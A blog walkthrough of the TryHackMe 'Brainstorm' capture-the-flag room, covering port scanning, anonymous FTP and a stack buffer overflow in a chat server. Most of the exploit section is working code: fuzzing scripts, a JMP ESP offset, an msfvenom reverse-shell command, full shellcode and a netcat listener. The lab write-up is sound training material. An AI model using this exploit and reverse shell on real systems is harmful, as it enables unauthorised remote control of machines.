---
layout: post
title: "Brainstorm"
date: 2021-06-10
ctf: true
excerpt: "Walkthrough for Brainstorm on Try Hack Me"
tags: [buffer overflow, Try Hack Me]
comments: false
---

# Brainstorm

Brainstorm is a medium rated buffer overflow box on [Try Hack Me](https://tryhackme.com/room/brainstorm).

<details><summary><strong>Task 1 Hints</strong></summary>
<ul>
    <li>Have you started the machine?
    <li>Have you enumerated ALL TCP ports?
</ul>
</details>

<details><summary><strong>Task 2 Hints</strong></summary>
<ul>
    <li>One of the services you uncovered can be logged into anonymously, have you found it?
</ul>
</details>

<details><summary><strong>Task 3 Hints</strong></summary>
<ul>
    <li>Follow the hints given in this task, if you are still unsure, <a href="https://www.thecybermentor.com/buffer-overflows-made-easy"> The Cyber Mentor</a> does a good hands on walkthrough of a similar box.
</ul>
</details>

## Walkthrough

<details><summary><strong>Full Walkthrough</strong></summary>

### Task 1

#### Question 1

Just start the machine!

#### Question 2

![Brainstorm Task 1 Question 2](/assets/img/Brainstorm1.png)

There are several ways to answer this question, but one of the easiest is to use threader3000, as it will enumerate all TCP ports. This can be ran by running:

 **`threader3000`**

and then entering the IP address of the vulnerable host when prompted.

![Brainstorm threader3000](/assets/img/Brainstorm2.png)

This will provide the answer to this question, which should be  3 ports, but for some reason the answer is **6**. I've reviewed other walkthroughs to confirm, and it appears that everyone has the same 3 ports appear.

### Task 2

#### Question 1

Next, choose option 1 to run the suggested nmap scan. After a couple of minutes, you will see the following results:

![Brainstorm Task 2 Question 1 nmap](/assets/img/Brainstorm3.png)

You will see that there is an FTP server, RDP (3389) and a service named abyss on 9999. Let's look at the ftp server first and see if anonymous FTP access is available.

![Brainstorm Anonymous FTP](/assets/img/Brainstorm4.png)

Let's run

**`ls`**

and you will see a directory called chatserver, let's navigate to this directory with

**`cd chatserver`**

Let's run

**`ls`**

again, and you will see 2 files present: **chatserver.exe** and **essfunc.dll**.  The answer to this question is the executable file, **chatserver.exe.**

### Task 3

#### Question 1

There is no answer required for this question, just complete this task.

#### Question 2

Now we need to move these files to a local Windows box to figure out how to overflow the buffer.

Let's run

**`mget *`**

to download both of these files to our Kali box. 

![Brainstorm download FTP file](/assets/img/Brainstorm5.png)

Move these over to a Windows box for analysis with Immunity Debugger installed. In my case, since I was RDPed into both boxes, let's copy both of these files by selecting them, right clicking, and selecting Copy.

![Brainstorm Copy Files Kali Box](/assets/img/Brainstorm6.png)

Next, on the Windows machine, paste the files (this should work if you allow copy/paste over RDP).

![Brainstorm Paste to Windows system](/assets/img/Brainstorm7.png)

Next, start the chatserver program and open Immunity Debugger. Once started, we need to attach Immunity Debugger to chatserver. This is done by pressing **CTRL+F1** and selecting that chatserver application.

![Brainstorm Immunity Debugger Attach chatserver](/assets/img/Brainstorm8.png)

Next, let's click on the red arrow to run Immunity Debugger.

![Brainstorm run Immunity Debugger](/assets/img/Brainstorm9.png)

You should see the program running in the bottom right hand corner. Next, on our Kali box, let's connect to our Windows box with netcat.

This is done with:

**`nc <windows ip> 9999`**

![Brainstorm nc chat server](/assets/img/Brainstorm10.png)

Let's see if we can use a Python script to test the username section to see if it is vulnerable to a buffer overflow attack:

```python
#!/usr/bin/python

import socket

buff=["A"]
counter=100

while len(buff) <= 50:
    buff.append("A"*counter)
    counter=counter+200

for character in buff:
    print("Fuzzing PASS with %s bytes") % len(character)
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect=s.connect(('<victim ip address>', <victim port>))
    s.recv(1024)
    s.send('USER test\r\n')
    s.recv(1024)
    s.send('PASS ' + character + '\r\n')
    s.send('QUIT\r\n')
    s.close()
```

This script will attempt to send 200 "A"s and increase it by 200 each time until the chatserver crashes. With Immunity Debugger running on your Windows box attached to chatserver, let's start this script with: 

**`python <script name>`**

It appears that it crashed around 2,300 bytes:

![Brainstorm buffer overflow](/assets/img/Brainstorm12.png)

Back in Immunity Debugger, you can see that the EIP and ESP have been overwritten with 41414141, which is the hex equivalent of AAAA. 

![Brainstorm overwrite EIP ESP](/assets/img/Brainstorm13.png)    

Let's now use Metasploit's pattern create utility to help us figure out exactly where this is crashing. Let's run the following command:

**`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2300`**

![Brainstorm pattern_create.rb](/assets/img/Brainstorm14.png)

Next, let's modify our script above to look like the following:

``` python
#!/usr/bin/python
import socket

buff="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy"

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect(('192.168.1.121', 9999))
s.recv(1024)
s.send('USER test\r\n')
s.recv(1024)
s.send(buff)
s.send('QUIT\r\n')
s.close()
```

Next, restart the chatserver application, Immunity Debugger, and attach Immunity Debugger to chatserver and run this new script after. This should crash chatserver immediately. Let's make note of the value listed under EIP in Immunity Debugger.

![Brainstorm EIP Value](/assets/img/Brainstorm15.png)

Next, let's use Metasploit's pattern offset tool to find the exact match. This would be done with:

``` bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2300 -q 31704330
```

![Brainstorm offset](/assets/img/Brainstorm16.png)

This will provide the exact offset needed, which is 2012, and the answer to Question 2 (even though an answer is not required).

#### Question 3

Question 3 gives you a hint to look at the DLL downloaded to see if there's a function that can be used for execution without any protection. Let's take a look at this with Immunity Debugger. Restart chatserver and Immunity Debugger, attach and run the app in Immunity Debugger also.

Once done, run

**`!mona modules`**

 in the bar at the bottom of Immunity Debugger.

![Brainstorm Mona Modules](/assets/img/Brainstorm17.png)

Next, let's run:

**`!mona find -s "\xff\xe4" -m essfunc.dll`**

in the bottom toolbar of Immunity Debugger. This is searching for the hex value of the JMP ESP (\xff\xe4) in the essfunc.dll file. This will allow us to jump to the ESP and execute our payload.

![Brainstorm search for JMP ESP](/assets/img/Brainstorm18.png)

After running this, make note of the first memory address highlighted above (625014df). This will be utilized for our exploit. Since this is a 32 bit application, we will need to use little endian when converting this to hex for our script. This would end up with \xdf\x14\x50\x62 inserted into our script. Next, let's make the following updates to our script:

``` python
#!/usr/bin/python
import socket

buff= "A" * 2012 +  "\xdf\x14\x50\x62"
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect(('<victim ip>', <victim port>))
s.recv(1024)
s.send('USER test\r\n')
s.recv(1024)
s.send(buff)
s.send('QUIT\r\n')
s.close()
```

This script will send 2007 A's, which will get us to our offset for the buffer overflow, it will then send the value for the JMP ESP value. Let's save this script and restart chatserver, restart Immunity Debugger, attach chatserver, and click on run in Immunity Debugger. Next, click on the last icon before he letters in the Immunity Debugger toolbar.

![Brainstorm Immunity Toolbar](/assets/img/Brainstorm19.png)

Next enter the memory address (625014df) uncovered above.

![Brainstorm jump to 62501df](/assets/img/Brainstorm20.png)

Next, press **F2** to set a breakpoint here and ensure that running is showing in the lower right hand corner.

![Brainstorm Immunity Debugger Breakpoint](/assets/img/Brainstorm21.png)

Once this is set, run the script from our Kali box. Next, in Immunity, Debugger, you should see the JMP ESP value uncovered previously listed as the EIP value as shown below.

![Brainstorm confirm JMP ESP Value](/assets/img/Brainstorm22.png)

#### Question 4

This means that we can now create and insert a payload to exploit this box. Let's use msfvenom with the following command to create a payload to create a reverse shell:

``` 
msfvenom -p windows/shell_reverse_tcp LHOST=<Kali IP Address> LPORT=<Port of your choice> --platform windows -a x86 EXITFUNC=thread -b "\x00" -f python 
```

This will create an x86 reverse TCP shell for Windows in Python code. You should see output similar to that shown below:

![Brainstorm shellcode](/assets/img/Brainstorm23.png)

Copy and paste the code above into your python script. Your new script should look like the following:

``` python
#!/usr/bin/python

import socket

buf =  b""
buf += b"\xd9\xee\xba\x0b\x1f\xb7\x9a\xd9\x74\x24\xf4\x58\x33"
buf += b"\xc9\xb1\x52\x83\xe8\xfc\x31\x50\x13\x03\x5b\x0c\x55"
buf += b"\x6f\xa7\xda\x1b\x90\x57\x1b\x7c\x18\xb2\x2a\xbc\x7e"
buf += b"\xb7\x1d\x0c\xf4\x95\x91\xe7\x58\x0d\x21\x85\x74\x22"
buf += b"\x82\x20\xa3\x0d\x13\x18\x97\x0c\x97\x63\xc4\xee\xa6"
buf += b"\xab\x19\xef\xef\xd6\xd0\xbd\xb8\x9d\x47\x51\xcc\xe8"
buf += b"\x5b\xda\x9e\xfd\xdb\x3f\x56\xff\xca\xee\xec\xa6\xcc"
buf += b"\x11\x20\xd3\x44\x09\x25\xde\x1f\xa2\x9d\x94\xa1\x62"
buf += b"\xec\x55\x0d\x4b\xc0\xa7\x4f\x8c\xe7\x57\x3a\xe4\x1b"
buf += b"\xe5\x3d\x33\x61\x31\xcb\xa7\xc1\xb2\x6b\x03\xf3\x17"
buf += b"\xed\xc0\xff\xdc\x79\x8e\xe3\xe3\xae\xa5\x18\x6f\x51"
buf += b"\x69\xa9\x2b\x76\xad\xf1\xe8\x17\xf4\x5f\x5e\x27\xe6"
buf += b"\x3f\x3f\x8d\x6d\xad\x54\xbc\x2c\xba\x99\x8d\xce\x3a"
buf += b"\xb6\x86\xbd\x08\x19\x3d\x29\x21\xd2\x9b\xae\x46\xc9"
buf += b"\x5c\x20\xb9\xf2\x9c\x69\x7e\xa6\xcc\x01\x57\xc7\x86"
buf += b"\xd1\x58\x12\x08\x81\xf6\xcd\xe9\x71\xb7\xbd\x81\x9b"
buf += b"\x38\xe1\xb2\xa4\x92\x8a\x59\x5f\x75\xbf\x90\x5f\xa2"
buf += b"\xd7\xa8\x5f\xad\x9c\x24\xb9\xc7\xf2\x60\x12\x70\x6a"
buf += b"\x29\xe8\xe1\x73\xe7\x95\x22\xff\x04\x6a\xec\x08\x60"
buf += b"\x78\x99\xf8\x3f\x22\x0c\x06\xea\x4a\xd2\x95\x71\x8a"
buf += b"\x9d\x85\x2d\xdd\xca\x78\x24\x8b\xe6\x23\x9e\xa9\xfa"
buf += b"\xb2\xd9\x69\x21\x07\xe7\x70\xa4\x33\xc3\x62\x70\xbb"
buf += b"\x4f\xd6\x2c\xea\x19\x80\x8a\x44\xe8\x7a\x45\x3a\xa2"
buf += b"\xea\x10\x70\x75\x6c\x1d\x5d\x03\x90\xac\x08\x52\xaf"
buf += b"\x01\xdd\x52\xc8\x7f\x7d\x9c\x03\xc4\x9d\x7f\x81\x31"
buf += b"\x36\x26\x40\xf8\x5b\xd9\xbf\x3f\x62\x5a\x35\xc0\x91"
buf += b"\x42\x3c\xc5\xde\xc4\xad\xb7\x4f\xa1\xd1\x64\x6f\xe0"

buff= "A" * 2012 +  "\xdf\x14\x50\x62" + "\x90" * 32 + buf

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect(('<victim ip>', <victim port>))
s.recv(1024)
s.send('USER test\r\n')
s.recv(1024)
s.send(buff)
s.send('QUIT\r\n')
s.close()
```

Note that we added + "\x90" * 32 + buf to the end of the script, the "\x90" * 32 will enter 32 NOP values, which stand for no operation. This is typically called a "NOP" sled. This is best practice as it will increase the chances of your shellcode executing successfully. We also updated the IP address to that of the actual vulnerable box instead of our own.

Next, let's start a netcat listener with

**`nc -nvlp 443`**

on our Kali box.

![Brainstorm netcat](/assets/img/Brainstorm24.png)

Next, run the script and we should catch a shell on the netcat listener.

![Brainstorm shell on victim](/assets/img/Brainstorm25.png)

#### Question 5

Next, let's navigate to C:\users with:

**`cd c:\users`**

and type

**`dir`**

There is 1 user directory located here. Let's navigate to drake's desktop with

**`cd drake`**

**`cd Desktop`**

and run

**`dir`**

one more time, the root.txt file is here.

![Brainstorm enumerate user directory](/assets/img/Brainstorm26.png)

Next, run:

**`type root.txt`**

to get the root hash for this box!

![Brainstorm root](/assets/img/Brainstorm27.png)

</details>
